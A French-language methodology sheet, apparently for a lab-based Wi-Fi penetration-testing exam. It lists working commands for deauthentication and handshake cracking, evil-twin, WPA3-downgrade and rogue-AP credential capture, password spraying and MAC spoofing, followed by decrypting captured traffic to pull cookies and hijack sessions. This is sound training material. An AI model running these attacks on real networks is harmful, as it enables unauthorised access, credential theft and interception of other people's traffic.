# Méthodologie Exam Wi-Fi

> **Tu viens de recevoir l'accès à la VM du labo. Voici exactement ce que tu fais, dans l'ordre.**

---

## Vue d'ensemble

```
Étape 1 → Setup (2 min)
Étape 2 → Reconnaissance globale (5 min)
Étape 3 → Identifier le protocole cible
Étape 4 → Appliquer l'attaque correspondante
Étape 5 → Exploitation post-accès (si pertinent)
```

---

## Étape 1 : Setup

```bash
# Lister les interfaces Wi-Fi disponibles
sudo airmon-ng
# → noter le nom de l'interface (ex: wlan0, wlp3s0, wlx...)

# Tuer les services qui interfèrent
sudo airmon-ng check kill

# Activer le mode moniteur sur l'interface identifiée
sudo airmon-ng start <IFACE>

# Vérifier : <IFACE>mon doit apparaître
sudo iwconfig
```

```bash
# Créer le dossier de travail
mkdir -p ~/wifi/{captures,creds}
cd ~/wifi
```

---

## Étape 2 : Reconnaissance globale

```bash
# Scanner toutes les bandes (2.4 + 5 GHz), noter WPS activé, fabricant
sudo airodump-ng <IFACE_MON> --manufacturer --wps --band abg -w ~/wifi/captures/scan
```

**Ce que tu notes pour chaque AP cible :**

| Champ | Valeur à noter |
|---|---|
| ESSID | Nom du réseau |
| BSSID | MAC de l'AP |
| CH | Canal |
| ENC | OPN / WEP / WPA2 / WPA3 |
| AUTH | PSK (perso) / MGT (enterprise) |
| CIPHER | CCMP (WPA2) / GCMP (WPA3) / TKIP (vieux) |
| CLIENTS | MACs des stations connectées |
| PROBES | Réseaux cherchés par les clients non associés |

---

## Étape 3 : Arbre de décision

```
ENC = OPN
    → AUTH = PSK ou rien
        → Connexion directe (wpa_supplicant + dhclient)
        → Tester admin:admin sur le routeur
        → Si portail captif : MAC spoofing avec macchanger

ENC = WEP
    → besside-ng -c <canal> -b <BSSID> wlan2
    → Si besside-ng indisponible : airodump + aireplay --arpreplay + aircrack-ng

ENC = WPA2 / AUTH = PSK
    → Capturer handshake (airodump -w + aireplay -0)
    → aircrack-ng -w rockyou
    → Si SSID caché ou client mémorisé : Evil Twin hostapd-mana → hashcat -m 22000

ENC = WPA3 / AUTH = PSK (SAE)
    → wacker --wordlist rockyou --ssid ... --bssid ... --interface wlan2 --freq ...
    → Si AUTH = SAE+PSK : vérifier MFP → downgrade WPA2 → hostapd-mana → hashcat -m 22000

ENC = WPA2 ou WPA3 / AUTH = MGT (Enterprise)
    → Capture passive : lire identités EAP (Wireshark : eap && eap.code == 2 && eap.identity)
    → Lire certificat TLS (tshark -e x509sat.IA5String)
    → EAP_buster pour identifier les méthodes EAP
    → Rogue AP avec eaphammer → hashcat -m 5500 (MSCHAPv2)
    → Brute force air-hammer (utilisateur connu)
    → Password spraying air-hammer (liste users, mot de passe unique)
```

---

## Étape 4 : Commandes de référence rapide

### OPN

```bash
# Connexion réseau ouvert
cat > ~/wifi/open.conf << EOF
network={
    ssid="<SSID>"
    key_mgmt=NONE
    scan_ssid=1
}
EOF
sudo wpa_supplicant -D nl80211 -i <IFACE> -c ~/wifi/open.conf &
sudo dhclient <IFACE> -v

# MAC spoofing (portail captif)
# <MAC_CIBLE> : MAC d'un client autorisé (vue dans airodump-ng ou arp-scan)
sudo systemctl stop NetworkManager
sudo ip link set <IFACE> down
sudo macchanger -m <MAC_CIBLE> <IFACE>
sudo ip link set <IFACE> up
```

### WEP

```bash
# Automatique (interface managed)
sudo besside-ng -c <CH> -b <BSSID> <IFACE> -v

# Manuel (interface monitor)
sudo airodump-ng --bssid <BSSID> -c <CH> -w ~/wifi/captures/wep <IFACE_MON> &
sudo aireplay-ng --arpreplay -b <BSSID> -h <MAC_SRC> <IFACE_MON>
sudo aircrack-ng ~/wifi/captures/wep-01.cap

# Connexion après crack (enlever les ':' de la clé hexadécimale)
sudo wpa_supplicant -D nl80211 -i <IFACE> -c ~/wifi/wep.conf
```

### WPA2-PSK

```bash
# Capture handshake
sudo airodump-ng --bssid <BSSID> -c <CH> -w ~/wifi/captures/wpa2 <IFACE_MON> &
sudo aireplay-ng -0 10 -a <BSSID> <IFACE_MON>
# Attendre "WPA handshake: <BSSID>" dans airodump-ng

# Crack
aircrack-ng ~/wifi/captures/wpa2-01.cap -w <WORDLIST>

# Evil Twin (SSID caché ou client mémorisé)
sudo hostapd-mana ~/wifi/hostapd-evil.conf
# Attendre handshake → CTRL+C
hashcat -a 0 -m 22000 ~/wifi/clean.22000 <WORDLIST> --force
hashcat -m 22000 ~/wifi/clean.22000 --show
```

### WPA3-SAE

```bash
# Brute force en ligne
# <FREQ> : 2412=CH1, 2437=CH6, 2462=CH11, ou formule 2.4G : 2407 + (CH * 5)
cd ~/tools/wacker/
./wacker.py --wordlist <WORDLIST> \
    --ssid <SSID> --bssid <BSSID> \
    --interface <IFACE> --freq <FREQ>

# Downgrade (WPA3+WPA2 mixte, MFP désactivé)
sudo hostapd-mana ~/wifi/hostapd-downgrade.conf &
iwconfig <IFACE_MON> channel <CH>
sudo aireplay-ng -0 0 -a <BSSID> -c <MAC_CLIENT> <IFACE_MON>
# hcxhash2cap + hcxpcapngtool → hashcat -m 22000
```

### WPA-Enterprise (MGT)

```bash
# Passif : identité EAP
sudo airodump-ng <IFACE_MON> -w ~/wifi/captures/mgt -c <CH>
wireshark ~/wifi/captures/mgt-01.cap
# Filtre : eap && eap.code == 2 && eap.identity

# Certificat TLS (depuis la même capture)
tshark -r ~/wifi/captures/mgt-01.cap \
    -Y "wlan.bssid == <BSSID> && x509sat.IA5String" \
    -T fields -e x509sat.IA5String

# Méthode EAP
bash ~/tools/EAP_buster/EAP_buster.sh <SSID> '<DOMAIN>\<USER_FICTIF>' <IFACE>

# Rogue AP MSCHAPv2
cd ~/tools/eaphammer
python3 ./eaphammer --cert-wizard
python3 ./eaphammer -i <IFACE> --auth wpa-eap --essid <SSID> --creds --negotiate balanced
iwconfig <IFACE_MON> channel <CH>
sudo aireplay-ng -0 0 -a <BSSID> -c <MAC_CLIENT> <IFACE_MON>
cat logs/hostapd-eaphammer.log | grep hashcat | awk '{print $3}' >> ~/wifi/mschap.5500
hashcat -a 0 -m 5500 ~/wifi/mschap.5500 <WORDLIST> --force

# Brute force (utilisateur connu)
echo '<DOMAIN>\<USERNAME>' > ~/wifi/creds/target.user
./air-hammer.py -i <IFACE> -e <SSID> -p <WORDLIST> -u ~/wifi/creds/target.user

# Spraying (un seul mot de passe sur liste d'utilisateurs)
./air-hammer.py -i <IFACE> -e <SSID> -P <MOT_DE_PASSE> -u ~/wifi/creds/users-domain.txt
```

---

## Étape 5 : Post-accès

```bash
# Déchiffrer le trafic WPA2 capturé
airdecap-ng -e <SSID> -p <PASSWORD> ~/wifi/captures/wpa2-01.cap
# Génère : ~/wifi/captures/wpa2-01-dec.cap

# Analyser dans Wireshark
wireshark ~/wifi/captures/wpa2-01-dec.cap
# Filtre HTTP    : http
# Filtre cookies : http.cookie
# Filtre POST    : http.request.method == "POST"

# Tester l'isolation entre clients
sudo arp-scan -I <IFACE> -l
curl http://<IP_CLIENT>
```

---

## Checklist complète exam Wi-Fi

```
Setup
[ ] airmon-ng → interface identifiée
[ ] airmon-ng check kill
[ ] airmon-ng start <IFACE> → <IFACE>mon visible
[ ] Dossier ~/wifi/ créé

Reconnaissance
[ ] airodump-ng --band abg lancé
[ ] BSSID, canal, ENC, AUTH notés pour chaque AP cible
[ ] Clients et probes identifiés
[ ] SSID cachés repérés (length:N)

Identification du vecteur d'attaque
[ ] ENC = OPN → connexion directe ou MAC spoofing
[ ] ENC = WEP → besside-ng ou manuel
[ ] ENC = WPA2, AUTH = PSK → handshake + crack
[ ] ENC = WPA2, AUTH = PSK, client mémorisé → Evil Twin
[ ] ENC = WPA3, AUTH = SAE → wacker
[ ] ENC = WPA3+WPA2, MFP off → downgrade
[ ] AUTH = MGT → pipeline Enterprise

Accès initial
[ ] Mot de passe / clé obtenu(e)
[ ] Connexion au réseau validée (wpa_supplicant + dhclient)
[ ] IP obtenue et trafic réseau confirmé

Exploitation post-accès
[ ] airdecap-ng lancé sur la capture
[ ] Trafic HTTP analysé dans Wireshark
[ ] Cookies / identifiants extraits si présents
[ ] Session hijacking tenté si cookie récupéré
[ ] arp-scan lancé pour vérifier l'isolation
[ ] Accès direct vers les autres clients testé
```

---

## Erreurs fréquentes

| Symptôme | Cause probable | Solution |
|---|---|---|
| `<IFACE>mon` n'apparaît pas | Mode moniteur non activé | `airmon-ng` pour trouver l'interface, puis `airmon-ng check kill` + `airmon-ng start <IFACE>` |
| airodump-ng ne voit aucun réseau | Mauvaise bande scannée | Ajouter `--band abg` |
| Handshake non capturé | Pas de client actif | `aireplay-ng -0 10 -a <BSSID>` pour forcer la reconnexion |
| aircrack-ng ne trouve pas | Mot de passe hors dictionnaire | Essayer rockyou complet ou règles hashcat |
| hashcat `-m 2500` échoue | Format hccapx obsolète | Convertir avec `hcxhash2cap` + `hcxpcapngtool` → `-m 22000` |
| wacker aucun résultat | SSID ou BSSID incorrect, ou fréquence erronée | Vérifier avec airodump-ng, recalculer `--freq` depuis le canal |
| hostapd-mana : no response | Client n'envoie pas de probes | Déauthentifier le client du vrai AP d'abord |
| airdecap-ng : 0 décapés | Handshake absent dans la capture | Recapturer avec le handshake présent |
| air-hammer timeouts | Version obsolète ou dépendances | Vérifier Python et les imports |
